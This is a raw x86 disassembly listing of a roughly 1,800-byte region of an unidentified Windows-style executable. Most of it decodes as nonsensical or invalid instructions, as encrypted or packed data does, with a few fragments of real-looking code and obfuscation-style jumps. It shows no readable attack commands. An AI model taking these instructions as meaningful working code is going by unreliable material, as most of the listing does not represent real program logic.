  40a829:	lock test al,0xc1
  40a82c:	mov    ebx,DWORD PTR [ecx+edx*4-0x7]
  40a830:	ret    0xc399
  40a833:	fdiv   QWORD PTR [ecx]
  40a835:	je     0x40a857
  40a837:	adc    eax,0x51f97f9f
  40a83c:	bsf    edx,DWORD PTR cs:0x3a9486cc
  40a844:	pushf  
  40a845:	sub    BYTE PTR [ecx-0x66],al
  40a848:	out    0xee,eax
  40a84a:	fidiv  DWORD PTR [eax-0x856ee03]
  40a850:	jp     0x40a866
  40a852:	mov    ds:0x4feadb80,al
  40a857:	(bad)  
  40a859:	aaa    
  40a85a:	not    BYTE PTR [eax-0x390b7861]
  40a860:	cwde   
  40a861:	fisub  WORD PTR [edx+ebp*2-0x23]
  40a865:	dec    esi
  40a866:	repz sub al,0x2a
  40a869:	dec    ebp
  40a86a:	sub    dl,ch
  40a86c:	sbb    al,0x4c
  40a86e:	dec    ecx
  40a86f:	(bad)  
  40a870:	inc    esp
  40a871:	add    DWORD PTR [ebx*2+0x53487034],ecx
  40a878:	mov    ch,BYTE PTR [ebx]
  40a87a:	xchg   dx,ax
  40a87c:	jb     0x40a7fe
  40a87e:	pop    ss
  40a87f:	xlat   BYTE PTR ds:[ebx]
  40a880:	dec    edi
  40a881:	push   cs
  40a882:	cld    
  40a883:	and    ah,al
  40a885:	je     0x40a816
  40a887:	xchg   ecx,eax
  40a888:	mov    al,es:0x7aed99fb
  40a88e:	dec    ecx
  40a88f:	dec    edx
  40a890:	mov    BYTE PTR [ecx+ecx*8],ch
  40a893:	retf   
  40a894:	mov    BYTE PTR [edx+0x2fe8bc76],bl
  40a89a:	mov    edi,0xd291e9ac
  40a89f:	cmp    eax,0xae4de3ee
  40a8a4:	ror    BYTE PTR [esi],cl
  40a8a6:	pop    ecx
  40a8a7:	mov    dh,BYTE PTR fs:[esi-0x1c45376c]
  40a8ae:	(bad)  
  40a8af:	fisubr DWORD PTR [edi-0x17ad1304]
  40a8b5:	push   0x2d58c5ba
  40a8ba:	cli    
  40a8bb:	dec    ecx
  40a8bc:	in     al,0xb2
  40a8be:	sti    
  40a8bf:	out    0xc0,al
  40a8c1:	das    
  40a8c2:	mov    ds:0x13993293,al
  40a8c7:	hlt    
  40a8c8:	shr    DWORD PTR [ebx],1
  40a8ca:	retf   0xb97e
  40a8cd:	imul   ebp,DWORD PTR [edi+0x51],0x65
  40a8d1:	loope  0x40a85d
  40a8d3:	jle    0x40a926
  40a8d5:	lea    ecx,[ecx-0x30ee876]
  40a8db:	in     al,0xe
  40a8dd:	sub    al,0xfe
  40a8df:	cmc    
  40a8e0:	inc    eax
  40a8e1:	into   
  40a8e2:	cmp    al,BYTE PTR ds:0x3d74eb26
  40a8e8:	cmc    
  40a8e9:	or     di,WORD PTR [eax]
  40a8ec:	fstp   QWORD PTR [ebx+esi*2]
  40a8ef:	scas   eax,DWORD PTR es:[edi]
  40a8f0:	pop    eax
  40a8f1:	pop    ebp
  40a8f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8f3:	sbb    eax,DWORD PTR [edx+0x47bc53f4]
  40a8f9:	push   es
  40a8fa:	xchg   esp,eax
  40a8fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8fc:	xchg   esi,eax
  40a8fd:	data16 loop 0x40a8cc
  40a900:	mov    bh,0x5c
  40a902:	dec    esp
  40a903:	jne    0x40a907
  40a905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a906:	int    0x62
  40a908:	shr    BYTE PTR [ecx],1
  40a90a:	or     eax,0xae97696
  40a90f:	adc    BYTE PTR [edi-0x3f],dh
  40a912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a913:	sub    ah,BYTE PTR [ebx+0x2d40bc6f]
  40a919:	xchg   dh,dl
  40a91b:	and    BYTE PTR [eax+ebx*2-0x37],0x27
  40a920:	pop    eax
  40a921:	xor    DWORD PTR [edx],esi
  40a923:	jg     0x40a8f5
  40a925:	cmp    eax,DWORD PTR [esi-0x4c]
  40a928:	sti    
  40a929:	mov    eax,ecx
  40a92b:	push   0x692480a6
  40a930:	dec    ebx
  40a931:	out    dx,eax
  40a932:	dec    ebp
  40a933:	xchg   edx,eax
  40a934:	imul   DWORD PTR [ecx]
  40a936:	inc    esp
  40a937:	jo     0x40a944
  40a939:	xor    al,0x2
  40a93b:	and    al,0x98
  40a93d:	add    dl,bh
  40a93f:	rcl    DWORD PTR [ecx+edi*1+0x56],cl
  40a943:	jmp    0x2003:0xdb915f6f
  40a94a:	(bad)  
  40a94b:	stos   DWORD PTR es:[edi],eax
  40a94c:	mov    edi,0x67bd0b1e
  40a951:	mov    al,dh
  40a953:	jnp    0x40a8df
  40a955:	cmc    
  40a956:	xor    al,0xc4
  40a958:	add    eax,0x69d5ea5b
  40a95d:	leave  
  40a95e:	mov    ebp,0x675264da
  40a963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a965:	rol    esp,cl
  40a967:	cs inc ebp
  40a969:	fdivr  QWORD PTR ds:[ecx+0x2c]
  40a96d:	pop    ss
  40a96e:	sar    edx,0x44
  40a971:	out    0x5c,eax
  40a973:	pop    ebx
  40a975:	add    cl,BYTE PTR [esi-0x32]
  40a978:	nop
  40a979:	icebp  
  40a97a:	push   ds
  40a97b:	dec    esi
  40a97c:	jb     0x40a978
  40a97e:	and    BYTE PTR [esp+edi*2-0xd85532e],cl
  40a985:	add    BYTE PTR [edi+0x5853787f],0x57
  40a98c:	sub    eax,0x5f7b7249
  40a991:	mul    DWORD PTR [esi]
  40a993:	xchg   esp,eax
  40a994:	xor    esp,edi
  40a996:	(bad)  
  40a997:	out    dx,eax
  40a998:	adc    eax,0x54bd9eb7
  40a99d:	or     esi,DWORD PTR [esi-0x6d]
  40a9a0:	aad    0x1c
  40a9a2:	enter  0x5cf,0x79
  40a9a6:	fild   QWORD PTR [ebx]
  40a9a8:	push   eax
  40a9a9:	inc    esi
  40a9aa:	fwait
  40a9ab:	lds    ebx,FWORD PTR [eax]
  40a9ad:	add    ebx,ebp
  40a9af:	adc    eax,DWORD PTR [edi+0x0]
  40a9b2:	or     DWORD PTR [edi],esi
  40a9b4:	xchg   DWORD PTR [ecx],edi
  40a9b6:	out    dx,eax
  40a9b7:	and    BYTE PTR [ebx],bh
  40a9b9:	inc    ecx
  40a9ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9bb:	cdq    
  40a9bc:	loope  0x40a969
  40a9be:	fldenv [ecx+0x7f258a25]
  40a9c4:	fwait
  40a9c5:	pushf  
  40a9c6:	xchg   BYTE PTR [ebp-0x5b],bl
  40a9c9:	shl    BYTE PTR [edi+0x8],1
  40a9cc:	xchg   esi,eax
  40a9cd:	rcl    DWORD PTR [ecx],cl
  40a9cf:	test   eax,0xfa27bb16
  40a9d4:	mov    al,0x0
  40a9d6:	ins    DWORD PTR es:[edi],dx
  40a9d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9d8:	lods   eax,DWORD PTR ss:[esi]
  40a9da:	pop    ebx
  40a9db:	inc    ebx
  40a9dc:	inc    ebx
  40a9dd:	cmc    
  40a9de:	stos   BYTE PTR es:[edi],al
  40a9df:	ins    DWORD PTR es:[edi],dx
  40a9e0:	push   ss
  40a9e1:	sub    ebx,DWORD PTR [edx-0x3ce38db8]
  40a9e7:	push   ds
  40a9e8:	sbb    al,BYTE PTR [ebx+0x52bf26ea]
  40a9ee:	push   ss
  40a9ef:	sub    eax,0x828ab0ea
  40a9f4:	loop   0x40aa72
  40a9f6:	daa    
  40a9f7:	call   0x9d34:0x37bd99fb
  40a9fe:	push   0xffffff8f
  40aa00:	imul   ebp,ebx,0xffffff86
  40aa03:	or     BYTE PTR [esi+0x6d84eb33],bl
  40aa09:	sbb    al,0x5e
  40aa0b:	xchg   esi,eax
  40aa0c:	push   cs
  40aa0d:	sub    BYTE PTR [ecx],ah
  40aa0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa10:	mov    WORD PTR [eax+0x7d],?
  40aa13:	sahf   
  40aa14:	fldenv ds:0xf732fc2
  40aa1a:	xchg   eax,ebx
  40aa1c:	xchg   edi,eax
  40aa1d:	adc    cl,BYTE PTR [ecx]
  40aa1f:	je     0x40a9cf
  40aa21:	add    DWORD PTR [esi-0x37b9d482],eax
  40aa27:	shl    cl,0xa6
  40aa2a:	stc    
  40aa2b:	fnsave [eax-0x52b6495b]
  40aa31:	ret    0xa0b8
  40aa34:	lods   al,BYTE PTR ds:[esi]
  40aa35:	push   es
  40aa36:	aam    0xe5
  40aa38:	xor    ecx,ecx
  40aa3a:	or     BYTE PTR [edi-0x8],ch
  40aa3d:	xor    eax,0x92e2f25a
  40aa42:	test   al,0x42
  40aa44:	jns    0x40aa7b
  40aa46:	jb     0x40a9e2
  40aa48:	sub    bh,cl
  40aa4a:	sbb    edx,DWORD PTR [eax+0x7f118fc0]
  40aa50:	pop    es
  40aa51:	repz sahf 
  40aa53:	shr    DWORD PTR [edi+0x582c7953],1
  40aa59:	in     eax,dx
  40aa5a:	sbb    eax,0x33c22b8b
  40aa5f:	shl    bh,cl
  40aa61:	idiv   BYTE PTR [esi+0xdbd]
  40aa67:	add    eax,esi
  40aa69:	cmp    ecx,eax
  40aa6b:	jae    0x40b05a
  40aa71:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40aa78:	mov    DWORD PTR [ebp-0x20],0x383e
  40aa7f:	mov    DWORD PTR [ebp-0x24],0x3a3a
  40aa86:	mov    DWORD PTR [ebp-0x14],0x13cd
  40aa8d:	jmp    0x40ad24
  40aa92:	popa   
  40aa93:	clc    
  40aa94:	jnp    0x40aae9
  40aa96:	jl     0x40aaec
  40aa98:	imul   edi,eax,0x9e64741c
  40aa9e:	cld    
  40aa9f:	cmp    ch,cl
  40aaa1:	jecxz  0x40aa8d
  40aaa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaa4:	mov    esi,0xbec2a9be
  40aaa9:	mov    esi,0x9475875e
  40aaae:	mov    eax,eax
  40aab0:	cld    
  40aab1:	bound  esp,QWORD PTR [edx]
  40aab3:	mov    DWORD PTR [ecx-0x4a],edx
  40aab6:	mov    eax,0x26b96e5
  40aabb:	ds push ebx
  40aabd:	mov    bl,0x87
  40aabf:	xor    al,0x9d
  40aac1:	add    ch,BYTE PTR [ecx]
  40aac3:	mov    edx,0x265966af
  40aac8:	and    DWORD PTR [eax],esi
  40aaca:	inc    esi
  40aacb:	retf   0xdd9b
  40aace:	sub    ebx,ecx
  40aad0:	pop    ebp
  40aad1:	mov    ebx,0x6cd4b450
  40aad6:	adc    eax,0x7066efe
  40aadb:	loop   0x40ab18
  40aadd:	mov    bh,0xb5
  40aadf:	paddw  mm1,mm2
  40aae2:	cmp    BYTE PTR [esi],cl
  40aae4:	push   esi
  40aae5:	jne    0x40ab2d
  40aae7:	adc    esi,DWORD PTR [ebx]
  40aae9:	and    eax,0xf2088e79
  40aaee:	rcl    DWORD PTR [esi+0x61],1
  40aaf1:	jge    0x40aaaa
  40aaf3:	sbb    cl,BYTE PTR [edx-0x1d]
  40aaf6:	pop    es
  40aaf7:	adc    al,0x98
  40aaf9:	jae    0x40ab17
  40aafb:	mov    al,0x85
  40aafd:	loopne 0x40aaba
  40aaff:	dec    edi
  40ab00:	pop    esp
  40ab01:	push   edi
  40ab02:	dec    ebp
  40ab03:	ins    BYTE PTR es:[edi],dx
  40ab04:	adc    ebx,DWORD PTR [ebx]
  40ab06:	mov    dl,0xbf
  40ab08:	out    0x27,eax
  40ab0a:	call   0x6453:0xcfb35a2a
  40ab11:	mov    eax,0x47ab1743
  40ab16:	jecxz  0x40ab96
  40ab18:	jp     0x40aabb
  40ab1a:	pushf  
  40ab1b:	addr16 cld 
  40ab1d:	loopne 0x40aaf7
  40ab1f:	mov    bl,0xea
  40ab21:	sbb    al,0x9c
  40ab23:	outs   dx,BYTE PTR ds:[esi]
  40ab24:	inc    esi
  40ab25:	dec    esp
  40ab26:	test   cl,bh
  40ab28:	mov    edx,0x15c6abf7
  40ab2d:	add    ebx,DWORD PTR [eax+0x5d]
  40ab30:	jle    0x40ab1d
  40ab32:	repnz adc ebp,DWORD PTR [ecx+edx*1]
  40ab36:	test   eax,0x7515ecee
  40ab3b:	xchg   al,dh
  40ab3d:	sub    DWORD PTR [ebx-0x6012465],0x4aa9a4c
  40ab47:	jno    0x40ab93
  40ab49:	fisubr DWORD PTR [eax]
  40ab4b:	data16 jne 0x40abaf
  40ab4e:	dec    ecx
  40ab4f:	(bad)  
  40ab50:	push   edi
  40ab51:	push   esi
  40ab52:	sbb    DWORD PTR [esi+0x4e65c530],ecx
  40ab58:	add    DWORD PTR [ebp+0x27],esp
  40ab5b:	xchg   esi,eax
  40ab5c:	dec    eax
  40ab5d:	mov    eax,ds:0xbbb30fc2
  40ab62:	jne    0x40ab6b
  40ab64:	jnp    0x40abbb
  40ab66:	mov    cl,0x35
  40ab68:	xchg   ebx,eax
  40ab69:	adc    DWORD PTR [esi+0x3a],edi
  40ab6c:	pop    ds
  40ab6d:	xor    esi,esi
  40ab6f:	push   es
  40ab70:	sbb    al,0x49
  40ab72:	stos   BYTE PTR es:[edi],al
  40ab73:	mov    ch,0xa0
  40ab75:	scas   eax,DWORD PTR es:[edi]
  40ab76:	dec    ebx
  40ab77:	adc    dh,BYTE PTR [eax-0x29]
  40ab7a:	jo     0x40abea
  40ab7c:	and    BYTE PTR es:[esi+0x1bf034e2],bh
  40ab83:	sahf   
  40ab84:	xor    BYTE PTR [ebx],bl
  40ab86:	push   ds
  40ab87:	inc    esi
  40ab88:	mov    cl,0x25
  40ab8a:	pusha  
  40ab8b:	or     eax,0xa9fcc6e9
  40ab90:	call   0x29aa2ad6
  40ab95:	push   ecx
  40ab96:	dec    edx
  40ab97:	ret    
  40ab98:	xlat   BYTE PTR ds:[ebx]
  40ab99:	and    cl,al
  40ab9b:	push   esi
  40ab9c:	outs   dx,DWORD PTR ds:[esi]
  40ab9d:	out    dx,al
  40ab9e:	mov    ah,0xf7
  40aba0:	(bad)  [edx*1-0x1b32495e]
  40aba7:	je     0x40abbe
  40aba9:	das    
  40abaa:	rcl    DWORD PTR [ecx-0x57ce8762],cl
  40abb0:	inc    ecx
  40abb1:	cmp    edi,edi
  40abb3:	cmp    ecx,ebx
  40abb5:	enter  0xd9c6,0xcd
  40abb9:	pop    ecx
  40abba:	stos   DWORD PTR es:[edi],eax
  40abbb:	sbb    esp,eax
  40abbd:	pop    ecx
  40abbe:	sbb    cl,BYTE PTR [ebp-0x5a89d2b9]
  40abc4:	neg    esi
  40abc6:	jle    0x40ac16
  40abc8:	and    DWORD PTR [edi+0x3d55cb64],0xd6579444
  40abd2:	inc    ebp
  40abd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abd4:	int    0x5c
  40abd6:	lods   eax,DWORD PTR ds:[esi]
  40abd7:	out    dx,al
  40abd8:	or     DWORD PTR [ebx-0x2f],ecx
  40abdb:	call   0xdc5db8f6
  40abe0:	push   ss
  40abe1:	stos   DWORD PTR es:[edi],eax
  40abe2:	ds cmp esp,edi
  40abe5:	sbb    DWORD PTR [ebx],eax
  40abe7:	mov    ebp,0x95d0f9bc
  40abec:	call   0x77707d6f
  40abf1:	push   ds
  40abf2:	loope  0x40ac2f
  40abf4:	popa   
  40abf5:	fstp   QWORD PTR [ecx+0x5ef97c0b]
  40abfb:	inc    ebx
  40abfc:	fild   WORD PTR [esp+edx*4]
  40abff:	mov    ah,0x53
  40ac01:	out    0xf0,al
  40ac03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac04:	cdq    
  40ac05:	pushf  
  40ac06:	sbb    al,0x39
  40ac08:	sub    esi,edi
  40ac0a:	stc    
  40ac0b:	push   ecx
  40ac0c:	adc    al,0x78
  40ac0e:	xchg   ebx,eax
  40ac0f:	cmp    al,0x21
  40ac11:	into   
  40ac12:	cwde   
  40ac13:	mov    al,0xce
  40ac15:	and    eax,0x479581b8
  40ac1a:	adc    BYTE PTR [ebp+0x64],ah
  40ac1d:	(bad)  
  40ac1e:	in     al,0x69
  40ac20:	jbe    0x40ac05
  40ac22:	or     ah,BYTE PTR [ecx+0x4de62626]
  40ac28:	aas    
  40ac29:	push   esi
  40ac2a:	push   edi
  40ac2b:	in     eax,0xee
  40ac2d:	enter  0xaf1f,0xc7
  40ac31:	cwde   
  40ac32:	cld    
  40ac33:	xor    eax,0x693c4bb0
  40ac38:	push   es
  40ac39:	pop    ds
  40ac3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac3b:	push   ebx
  40ac3c:	cli    
  40ac3d:	xor    eax,0x7322b837
  40ac42:	xchg   esp,eax
  40ac43:	int    0x92
  40ac45:	pop    esi
  40ac46:	adc    BYTE PTR [edi+0x6eaae670],0x2b
  40ac4d:	out    0xe6,eax
  40ac4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac50:	or     dh,BYTE PTR [edx+0x1679ea0a]
  40ac56:	and    BYTE PTR [edx-0x9],0x3a
  40ac5a:	bound  esi,QWORD PTR [ecx]
  40ac5c:	enter  0x327f,0xf
  40ac60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac61:	mov    ?,edx
  40ac63:	and    dh,BYTE PTR [edi+edx*1]
  40ac66:	xchg   esp,esi
  40ac68:	sbb    BYTE PTR [ecx-0x7a97b4de],0xd2
  40ac6f:	xchg   esi,eax
  40ac70:	mov    eax,ds:0x36eeba22
  40ac75:	push   0xc67bf0b0
  40ac7a:	cdq    
  40ac7b:	jg     0x40acc9
  40ac7d:	pop    eax
  40ac7e:	pop    es
  40ac7f:	xchg   ebx,eax
  40ac80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac81:	scas   eax,DWORD PTR es:[edi]
  40ac82:	in     al,0xde
  40ac84:	push   eax
  40ac85:	or     DWORD PTR [edi-0x5f237316],eax
  40ac8b:	jo     0x40ac96
  40ac8d:	icebp  
  40ac8e:	jmp    0xd6e5:0x4d20ca71
  40ac95:	aas    
  40ac96:	mov    ebx,0xdbaec4
  40ac9b:	or     al,0x99
  40ac9d:	dec    edx
  40ac9e:	std    
  40ac9f:	mov    eax,DWORD PTR [eax+0x32b3393d]
  40aca5:	push   ebp
  40aca6:	stos   DWORD PTR es:[edi],eax
  40aca7:	push   esp
  40aca8:	dec    eax
  40aca9:	sbb    bh,BYTE PTR [ebx+0x4d]
  40acac:	inc    ecx
  40acad:	(bad)  
  40acae:	cmp    ah,BYTE PTR [eax-0x783500cd]
  40acb4:	ja     0x40accd
  40acb6:	fistp  WORD PTR [edx]
  40acb8:	mov    ss,ebp
  40acba:	in     eax,dx
  40acbb:	add    edx,DWORD PTR [edx-0x3e]
  40acbe:	jae    0x40ad20
  40acc0:	mov    al,ds:0xd243b30d
  40acc5:	into   
  40acc6:	lods   eax,DWORD PTR ds:[esi]
  40acc7:	cmp    al,0x29
  40acc9:	(bad)  
  40accb:	inc    ecx
  40accc:	repnz test bh,cl
  40accf:	je     0x40acef
  40acd1:	inc    eax
  40acd2:	popf   
  40acd3:	dec    esi
  40acd4:	cdq    
  40acd5:	test   eax,0xbf8cbc2c
  40acda:	jns    0x40aced
  40acdc:	mov    bh,0x18
  40acde:	pop    ss
  40acdf:	pop    esi
  40ace0:	(bad)  
  40ace1:	lahf   
  40ace2:	jl     0x40acd4
  40ace4:	pop    edx
  40ace5:	(bad)  
  40ace6:	pop    edi
  40ace7:	push   ebx
  40ace8:	push   edx
  40ace9:	dec    edx
  40aceb:	pop    ecx
  40acec:	fdivr  st(3),st
  40acee:	mov    dh,0xe4
  40acf0:	mov    WORD PTR [edx+0x4c1f018f],es
  40acf6:	cmp    ecx,esi
  40acf8:	fmul   QWORD PTR [edx-0x7ad149bf]
  40acfe:	push   edx
  40acff:	adc    DWORD PTR [ebx],ebp
  40ad01:	pop    ebx
  40ad02:	iret   
  40ad03:	dec    ecx
  40ad04:	out    dx,eax
  40ad05:	push   cs
  40ad06:	jmp    FWORD PTR [eax+ecx*1+0x2]
  40ad0a:	or     edx,eax
  40ad0c:	les    esp,FWORD PTR [esi]
  40ad0e:	and    DWORD PTR [edi-0x28],edi
  40ad11:	lock cld 
  40ad13:	lahf   
  40ad14:	in     al,dx
  40ad15:	push   ds
  40ad16:	mov    edi,0xc6a4ef64
  40ad1b:	sbb    esi,DWORD PTR [ebp+0x25573ca5]
  40ad21:	sub    al,0x13
  40ad23:	les    esi,FWORD PTR [ebx]
  40ad25:	rol    bh,cl
  40ad27:	inc    ebp
  40ad28:	call   0x40aeb4
  40ad2d:	mov    DWORD PTR [ebp-0x28],0x3224
  40ad34:	mov    eax,DWORD PTR [ebp-0x28]
  40ad37:	push   0x6
  40ad39:	pop    ebx
  40ad3a:	div    ebx
  40ad3c:	mov    edx,eax
  40ad3e:	mov    eax,ds:0x4226a8
  40ad43:	mov    eax,DWORD PTR [eax+0x1d0]
  40ad49:	sub    eax,edx
  40ad4b:	mov    edx,DWORD PTR [ebp-0x24]
  40ad4e:	jmp    0x40afe5
  40ad53:	dec    esp
  40ad54:	sub    BYTE PTR [ebp-0x49],ah
  40ad57:	test   eax,0xb93c9cb8
  40ad5c:	and    BYTE PTR [esi-0x61ddc470],bl
  40ad62:	nop
  40ad63:	aad    0xa9
  40ad65:	mov    esi,0xbec2a9be
  40ad6a:	mov    esi,0xc2466b5f
  40ad6f:	cli    
  40ad70:	xchg   edx,eax
  40ad71:	mov    edx,0xa9dacf88
  40ad76:	sub    eax,0x296e13d5
  40ad7b:	mov    edx,0x198fe569
  40ad80:	xchg   ebp,eax
  40ad81:	sub    BYTE PTR [ebx+0x7c2b9047],ah
  40ad87:	je     0x40ad5c
  40ad89:	push   ebp
  40ad8a:	imul   esp,DWORD PTR [esp+esi*1-0x57a03e0f],0xfffffffa
  40ad92:	pop    ds
  40ad93:	mov    WORD PTR [esi],gs
  40ad95:	adc    eax,0xcdb0984c
  40ad9a:	mov    eax,0x895a34df
  40ad9f:	scas   al,BYTE PTR es:[edi]
  40ada0:	mov    ah,0x76
  40ada2:	ret    0xe7b8
  40ada5:	nop
  40ada6:	lods   eax,DWORD PTR ds:[esi]
  40ada7:	inc    esi
  40ada8:	xchg   ecx,eax
  40ada9:	lahf   
  40adaa:	ins    BYTE PTR es:[edi],dx
  40adab:	loope  0x40adae
  40adad:	xor    al,0x92
  40adaf:	mov    edx,0x20fb82c3
  40adb4:	sbb    cl,dh
  40adb6:	mov    eax,0x31ffc597
  40adbb:	mov    bh,0x52
  40adbd:	jns    0x40ad67
  40adbf:	in     al,0xd3
  40adc1:	pop    ebp
  40adc2:	mov    bl,0xe1
  40adc4:	int3   
  40adc5:	push   edx
  40adc6:	mov    esp,0x64ca5388
  40adcb:	fldpi  
  40adcd:	push   esi
  40adce:	add    BYTE PTR [eax-0x69],ah
  40add1:	xchg   BYTE PTR [esi],ah
  40add3:	sbb    eax,0x5bfc57ff
  40add8:	fnsave [ebp-0x56]
  40addb:	retf   
  40addc:	inc    ebx
  40addd:	loope  0x40ad71
  40addf:	jg     0x40ae0c
  40ade1:	and    al,BYTE PTR [ecx+0x4b5b06ce]
  40ade7:	stos   BYTE PTR es:[edi],al
  40ade8:	out    0x79,eax
  40adea:	imul   ebp,DWORD PTR [edx+0x4d5a0428],0xffffffd9
  40adf1:	loop   0x40add1
  40adf3:	sbb    DWORD PTR [eax+0x65fb327],ebp
  40adf9:	add    ebp,DWORD PTR [ebx-0x39]
  40adfc:	arpl   dx,cx
  40adfe:	push   es
  40adff:	call   0xc42a:0xb7c13fd8
  40ae06:	sar    BYTE PTR [edx-0x2d],0xb2
  40ae0a:	mov    esi,0x7f86cf6e
  40ae0f:	lods   al,BYTE PTR ds:[esi]
  40ae10:	or     al,0x4c
  40ae12:	mov    WORD PTR [ecx+0x44],?
  40ae15:	sub    ebx,DWORD PTR [edx-0x65]
  40ae18:	and    BYTE PTR es:[ebx+eiz*8-0xb9fd2c3],0x7d
  40ae21:	sub    dh,BYTE PTR [edi+0x1a]
  40ae24:	loope  0x40ae4b
  40ae26:	loop   0x40ade4
  40ae28:	bound  ecx,QWORD PTR [edx-0x19]
  40ae2b:	xchg   ebp,eax
  40ae2c:	sbb    BYTE PTR [edi],cl
  40ae2e:	pop    ds
  40ae2f:	in     al,dx
  40ae30:	lods   eax,DWORD PTR ds:[esi]
  40ae31:	jbe    0x40add7
  40ae33:	div    BYTE PTR [ebp+0x42]
  40ae36:	retf   0x4dd1
  40ae39:	clc    
  40ae3a:	cld    
  40ae3b:	into   
  40ae3c:	mov    ah,0x74
  40ae3e:	lahf   
  40ae3f:	dec    eax
  40ae40:	mov    es,esi
  40ae42:	gs xor ecx,ebx
  40ae45:	xor    dh,BYTE PTR [edx]
  40ae47:	jp     0x40ae93
  40ae49:	fwait
  40ae4a:	pop    ecx
  40ae4b:	cmp    eax,0x8cb9a8e7
  40ae50:	xor    ah,BYTE PTR [esi-0x49]
  40ae53:	mov    bl,0xb7
  40ae55:	and    cl,ch
  40ae57:	sar    al,cl
  40ae59:	fidivr DWORD PTR [edi]
  40ae5b:	sub    al,0x6
  40ae5d:	gs dec ecx
  40ae5f:	xchg   ebp,eax
  40ae60:	add    BYTE PTR [esi],dl
  40ae62:	cmp    al,0x83
  40ae64:	xor    dl,BYTE PTR [ebp-0x1a]
  40ae67:	cmc    
  40ae68:	sbb    eax,0x4aa44d41
  40ae6d:	outs   dx,DWORD PTR ds:[esi]
  40ae6e:	xor    ebx,DWORD PTR [ebp+0x5f]
  40ae71:	daa    
  40ae72:	retf   
  40ae73:	repnz ror DWORD PTR [eax],cl
  40ae76:	or     eax,0xa770c2f0
  40ae7b:	sbb    bh,0x10
  40ae7e:	cmp    DWORD PTR [eax+0x6c],ecx
  40ae81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae82:	jmp    0x9d3c0600
  40ae87:	fmul   st(7),st
  40ae89:	mov    ?,WORD PTR [ebx-0x37c19527]
  40ae8f:	(bad)  
  40ae90:	sti    
  40ae91:	adc    eax,0xe2ebd872
  40ae96:	mov    BYTE PTR [edi-0x31fe63ff],ch
  40ae9c:	add    eax,0xdd2d0a7d
  40aea1:	mov    esp,0x61256bc2
  40aea6:	xor    dh,BYTE PTR [di-0x1ea4]
  40aeab:	or     esp,ebx
  40aead:	sub    al,0x7
  40aeaf:	add    eax,0x31aa7573
  40aeb4:	dec    edx
  40aeb5:	pop    es
  40aeb6:	std    
  40aeb7:	(bad)  
  40aeb8:	lahf   
  40aeb9:	sbb    DWORD PTR [ebp+edx*4-0x63],ecx
  40aebd:	sbb    al,BYTE PTR [ebx]
  40aebf:	out    0x3a,eax
  40aec1:	jae    0x40af29
  40aec3:	in     al,0xa0
  40aec5:	call   0xaccc:0x26787f93
  40aecc:	repz xor edi,DWORD PTR [esi+0x67c4a26c]
  40aed3:	(bad)  
  40aed4:	adc    DWORD PTR [edx+0x5d],ebp
  40aed7:	imul   ecx,ebx,0x4a
  40aeda:	inc    edi
  40aedb:	cdq    
  40aedc:	pop    es
  40aedd:	xchg   BYTE PTR [ebx],ch
  40aedf:	xchg   DWORD PTR [ebp+0x5f7ea5cc],esi
  40aee5:	cmp    eax,0x47c68748
  40aeea:	push   0xe81134fd
  40aeef:	cmp    DWORD PTR [eax+0x5bf0a3f7],esi
  40aef5:	test   al,0xbe
  40aef7:	add    edi,edx
  40aef9:	fcomp  DWORD PTR [edi+0x42]
  40aefc:	sbb    eax,0x5d055bcb
  40af01:	jns    0x40af65
  40af03:	scas   al,BYTE PTR es:[edi]
  40af04:	sub    al,BYTE PTR [ecx+0x29a3fcbf]
  40af0a:	ret    
  40af0b:	ins    BYTE PTR es:[edi],dx
  40af0c:	(bad)  
  40af0d:	int    0xc0
  40af0f:	mul    DWORD PTR [edi]
  40af11:	jp     0x40af7a
  40af13:	mov    ch,BYTE PTR [edx]
  40af15:	mov    esi,0x1291c5ea
  40af1a:	adc    BYTE PTR [edx-0x1e],ah
  40af1d:	mov    DWORD PTR [edi-0x49],esp
  40af20:	arpl   bx,dx
  40af22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af23:	rol    BYTE PTR [esi],cl
  40af25:	push   edx
  40af26:	aas    
  40af27:	cli    
  40af28:	daa    
  40af29:	stc    
  40af2a:	sub    ebx,edx
  40af2c:	dec    ecx
  40af2d:	or     al,0xe9
  40af2f:	mov    ecx,0x683d0a1a
  40af34:	adc    edx,DWORD PTR ss:[esi+0x13fbb881]
  40af3b:	pusha  
  40af3c:	push   cs
  40af3d:	dec    ebx
  40af3e:	inc    esp
  40af3f:	adc    ebx,ecx
  40af41:	cld    
  40af42:	push   ecx
  40af43:	lods   al,BYTE PTR ds:[esi]
  40af44:	not    edx
  40af46:	outs   dx,DWORD PTR ds:[esi]
  40af47:	repnz stos DWORD PTR es:[edi],eax
  40af49:	inc    esi
  40af4a:	inc    edx
  40af4b:	jnp    0x40aef0
  40af4d:	retf   0x7491
  40af50:	inc    esp
  40af51:	xor    eax,0x1c815c50
  40af56:	push   0x861736ef
  40af5b:	and    eax,0xf46a8f4e
  40af60:	ds jns 0x40af16
  40af63:	jge    0x40af7f
  40af65:	paddusb mm2,QWORD PTR ds:0xdd7fe4a8
  40af6c:	leave  
  40af6d:	jne    0x40af57
  40af6f:	dec    esi
  40af70:	les    esi,FWORD PTR [ecx]
  40af72:	aaa    
  40af73:	shl    ebx,1
  40af75:	lock sub ch,al
  40af78:	or     ecx,DWORD PTR [ebx+0x73c8d79d]
  40af7e:	cmp    ch,BYTE PTR [eax+edi*2-0x24584417]
